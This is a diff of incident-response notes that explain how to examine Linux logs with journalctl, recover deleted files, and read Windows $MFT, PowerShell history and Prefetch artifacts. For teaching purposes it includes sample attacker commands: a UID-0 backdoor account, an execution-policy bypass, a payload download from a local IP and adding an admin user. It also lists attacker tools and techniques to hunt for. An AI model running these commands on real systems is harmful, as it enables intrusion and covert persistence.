@@ -118,27 +118,66 @@ $ tail .bash_profile
 $ tail .bashrc
 (~/notmalware >/dev/null 2>&1 &)
 
-# systemd journal can be filtered for entries since the last boot with timestamps in UTC
-# we pass it the journal collected with UAC
-journalctl --file uac/\[root\]/var/log/journal/9fe98394f1ab41a8a40c2e0ea771cd59/system.journal --utc -b
+## systemd journal
+# stores log data including kernel messages, service stdout and stderr, in a queryable binary format
+# each entry has trusted fields that the kernel attaches to it, so even the originating process cannot forge them
+# trusted fields include _EXE, _PID, _UID, _CMDLINE and more, and can be viewed with -o verbose
+# for example we filter for entries since the last boot with timestamps in UTC
+# we pass it the journal collected with UAC with --file or the entire directory with --directory
+$ journalctl --file uac/\[root\]/var/log/journal/9fe98394f1ab41a8a40c2e0ea771cd59/system.journal --utc -b
+$ journalctl --directory uac/\[root\]/var/log/journal/ --utc -b
 Jun 11 10:39:28 sss systemd[1]: Started session-49.scope - Session 49 of User sss.
-# filter for a specific executable
+
+# we can also filter for a specific executable with _EXE
 # for example every sudo invocation is logged
-$ journalctl --file uac/\[root\]/var/log/journal/9fe98394f1ab41a8a40c2e0ea771cd59/system.journal --utc _EXE=/usr/bin/sudo
+$ journalctl --directory uac/\[root\]/var/log/journal/ --utc _EXE=/usr/bin/sudo
 Jun 11 11:24:20 sss sudo[312682]:      sss : TTY=pts/0 ; PWD=/home/sss ; USER=root ; COMMAND=./notmalware
 Jun 11 11:24:20 sss sudo[312682]: pam_unix(sudo:session): session opened for user root(uid=0) by sss(uid=1000)
 Jun 11 11:24:28 sss sudo[312682]: pam_unix(sudo:session): session closed for user root
 [..]
 
-# systemd journal shows evidence of execution via cron
-$ $ journalctl --file uac/\[root\]/var/log/journal/9fe98394f1ab41a8a40c2e0ea771cd59/system.journal --utc -u cron
-Jun 11 14:35:02 sss CRON[312769]: pam_unix(cron:session): session closed for user root
-Jun 11 14:35:02 sss CRON[312775]: (sss) CMD (~/payload)
+# we can also filter for suspicious user creations
+$ journalctl --directory uac/\[root\]/var/log/journal/ --utc _EXE=/usr/sbin/useradd -o verbose
+Fri 2026-06-12 07:36:49.104993 UTC [s=2203ca1644674d6c93dce047cf35c447;i=10351;b=1434c15bc76545e28f64>
+    _BOOT_ID=1434c15bc76545e28f647b4087a8689d
+    _MACHINE_ID=9fe98394f1ab41a8a40c2e0ea771cd59
+    _HOSTNAME=sss
+    _RUNTIME_SCOPE=system
+    PRIORITY=6
+    _UID=0
+    _GID=0
+    _SELINUX_CONTEXT=unconfined
+    _CAP_EFFECTIVE=1ffffffffff
+    _TRANSPORT=syslog
+    SYSLOG_FACILITY=10
+    _SYSTEMD_USER_SLICE=-.slice
+    _AUDIT_LOGINUID=1000
+    _SYSTEMD_OWNER_UID=1000
+    _SYSTEMD_SLICE=user-1000.slice
+    _AUDIT_SESSION=16
+    _SYSTEMD_CGROUP=/user.slice/user-1000.slice/session-16.scope
+    _SYSTEMD_SESSION=16
+    _SYSTEMD_UNIT=session-16.scope
+    _SYSTEMD_INVOCATION_ID=19d1c79f42b644e9856e34ed835bc309
+    SYSLOG_IDENTIFIER=useradd
+    _COMM=useradd
+    _EXE=/usr/sbin/useradd
+    SYSLOG_PID=3543
+    SYSLOG_TIMESTAMP=Jun 12 10:36:49
+    MESSAGE=new user: name=admin, UID=0, GID=0, home=/home/admin, shell=/bin/sh, from=/dev/pts/1
+    _PID=3543
+    _CMDLINE=useradd -o -u 0 -g 0 -m admin ### command line used
+    _SOURCE_REALTIME_TIMESTAMP=1781249809104993
+
+# we can also filter systemd journal for a specific unit with -u, for example cron
+$ journalctl --directory uac/\[root\]/var/log/journal/ --utc -u cron
 Jun 11 14:36:01 sss CRON[312791]: pam_unix(cron:session): session opened for user sss(uid=1000) by sss(uid=0)
 Jun 11 14:36:01 sss CRON[312792]: (sss) CMD (~/payload)
-Jun 11 14:37:01 sss CRON[312797]: pam_unix(cron:session): session opened for user sss(uid=1000) by sss(uid=0)
-Jun 11 14:37:01 sss CRON[312798]: (sss) CMD (~/payload)
 [..]
+# we can also filter for a specific user
+$ journalctl --directory uac/\[root\]/var/log/journal/ --utc _UID=1000 -o verbose
+# or the root user
+$ journalctl --directory uac/\[root\]/var/log/journal/ --utc _UID=0 -o verbose
 ```
 
 ### Evidence of past file presence
@@ -164,6 +203,7 @@ $ fls -r -d -o 4096 image.dd
 r/r * 662713(realloc):  tmp/.hidden/notmalware.sh
 r/r * 662782(realloc):  home/sss/notmalware
 [..]
+
 # icat recovers content by inode number
 # only works if the data blocks have not been overwritten
 $ icat image.dd 662782 > recovered_notmalware
@@ -172,6 +212,7 @@ $ icat image.dd 662782 > recovered_notmalware
 # look for packages used for post exploitation that may have been installed and removed
 $ grep 'install\|remove' uac/\[root\]/var/log/dpkg.log
 2026-06-09 11:43:53 status installed python3-pil:amd64 10.2.0-1ubuntu1.2
+
 # apt history log groups sessions and shows the commandline
 $ cat uac/\[root\]/var/log/apt/history.log
 Start-Date: 2026-06-11  17:42:29
@@ -191,8 +232,8 @@ End-Date: 2026-06-11  17:42:31
 
 ```
 # syslog is the primary logging service
-# filter for kernel module load events
-# look for modules loaded outside of package management or at unusual times
+# we filter for kernel module load events
+# we look for modules loaded outside of package management or at unusual times
 $ grep -i 'module\|insmod\|modprobe' /var/log/syslog
 ### TODO ADD DIAMORPHINE
 
@@ -222,7 +263,7 @@ $ grep -v ' 200 \| 400 ' uac/\[root\]/var/log/apache2/access.log | head
 
 ``` bash
 # auth.log shows account authentication patterns
-# -a to process  a  binary  file  as  if  it  were  text
+# -a to process a binary file as if it were text
 $ grep -a 'session opened' uac/\[root\]/var/log/auth.log
 2026-06-09T19:45:01.541448+03:00 sss CRON[158067]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
 [..]
@@ -302,22 +343,102 @@ Line	Tag	Entry Number	Sequence Number	Parent Entry Number	Parent Sequence Number
 
 ![mft](../media/mft-te.png)
 
+The most important fields are:
+
+- Parent Path
+- File Name
+- Extension
+- Has Ads and Is Ads (alternate data stream if any)
+- File Size in bytes
+- Created0x10 and	Created0x30
+- Last Modified0x10 and Last Modified0x30
+- Last Record Change0x10 and Last Record Change0x30
+- Last Access0x10 and	Last Access0x30
+- Zone Id Contents (if any)
+
+The difference between the timestamps:
+
+- 0x10 stores information from the `$STANDARD_INFORMATION` attribute
+  - can be altered by user level programs, vulnerable to tampering
+  - users see only these timestamps when checking a file in Windows Explorer
+- 0x30 stores information from the `$FILE_NAME` attribute
+  - strictly managed by the kernel
+  - users don't see it, used by the file system
+
 ### Command history
 
-```
-# cmd history
+`cmd` does not write its command history to disk, we can only retrieve it from memory.
 
-# powershell history
+Like bash, `powershell` writes its command history to a file, one command per line in order with no timestamps.
+This is the case since the `PSReadLine` module became default in PowerShell 5.
 
+These commands must be correlated with other artifacts that record timestamps, such as `$MFT` or `Prefetch` files.
+
+``` powershell 
+> Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+whoami
+Get-ExecutionPolicy
+Set-ExecutionPolicy Bypass -Scope Process
+Invoke-WebRequest http://192.168.1.37/payload.exe -OutFile $env:TEMP\payload.exe
+net user admin P@ssw0rd /add
+net localgroup administrators admin /add
 ```
+
+We look for:
+
+- download cradles (`IEX` or `Invoke-Expression`, `iwr` or `Invoke-WebRequest`, `curl`, `wget`)
+- execution policy changes (Set-ExecutionPolicy Bypass)
+- disabling Defender, AMSI bypasses
+- obfuscation (`-EncodedCommand` or `-enc`, string concatenation, format operators, `char[]` to break up keywords)
+- living-off-the-land binaries (`certutil`, `mshta`, `rundll32`, `wmic` used for download or execution)
+- discovery commands (`whoami /all`, `net user`, `net group`)
+- persistence or account manipulation (adding new users with `net user admin /add`, creating scheduled tasks)
+- credential access (`lsass`, `Invoke-Mimikatz`, etc)
 
 ### Prefetch files
 
-Prefetch files keep a record of the first and last run time of an executable, and a count of how many times it ran.
+Prefetch files keep a record of the first and last 6 run times of an executable, and a count of how many times it ran.
+They are a Windows performance feature that records which files and dependencies are loaded on the first run, so the next times it launches faster.
+This is proof an executable actually ran.
+
+Prefetch files are in `C:\Windows\Prefetch` and named by the executable and a hash and a `.pf` extension.
+The hash is derived from the executable's full path and commandline.
+
+They are enabled by default on workstations and disabled on servers.
 
 We parse prefetch files and output to csv.
 
-We analyze the csv with Timeline Explorer from EZ Tools.
+We analyze the 2 csv outputs with Timeline Explorer from EZ Tools.
+
+```
+# timeline, one row per run time
+Run Time	Executable Name
+2026-06-08 07:46:33	\VOLUME{01da3ed381705ea1-ca817eba}\USERS\TEST1\DOWNLOADS\ANYDESK.EXE
+[..]
+2026-05-29 13:39:55	\VOLUME{01da3ed381705ea1-ca817eba}\USERS\TEST1\DOWNLOADS\ANYDESK.EXE
+
+# detailed, one for per prefetch file
+Source Filename	                              Source Created	    Source Modified	    Source Accessed	    Executable Name	Run Count	Hash	    Size	  Version	Last Run	  Previous Run0	Previous Run1	Previous Run2	Previous Run3	Previous Run4	Previous Run5	Previous Run6	
+C:\Windows\Prefetch\ANYDESK.EXE-3438F174.pf		2026-01-28 08:23:29	2026-06-08 07:46:43	2026-06-15 17:23:40	ANYDESK.EXE	    104	      3438F174	96594		2026-06-08 07:46:33	2026-06-08 07:46:33	2026-06-08 07:46:33	2026-05-29 14:30:40	2026-05-29 14:30:40	2026-05-29 14:30:40	2026-05-29 14:03:32	2026-05-29 13:39:55
+```
+
+The most important fields are:
+
+- Source Filename and Executable Name
+- Run Count (how many times it executed)
+- Size in bytes
+- Version	Last Run 
+- Directories and Files Loaded (where the executable ran from and what it loaded)
+
+We look for:
+- execution from unexpected locations
+  - `Temp`, `Downloads`, `AppData`, `ProgramData` or a user profile instead of `System32` or `Program Files`
+- post exploitation tools or unexpected lolbins
+  - `mimikatz`, `nc`, `adfind`, `rclone`, `certutil`, `rundll32`
+- the same executable in different `.pf` files means it ran from different paths which could indicate adversary activity
+- the earliest run time to include in our timeline
+- low run count (sometimes just 1)
+- executable deleted from disk indicates adversary cleanup action
 
 ### ShimCache (AppCompatCache)
 
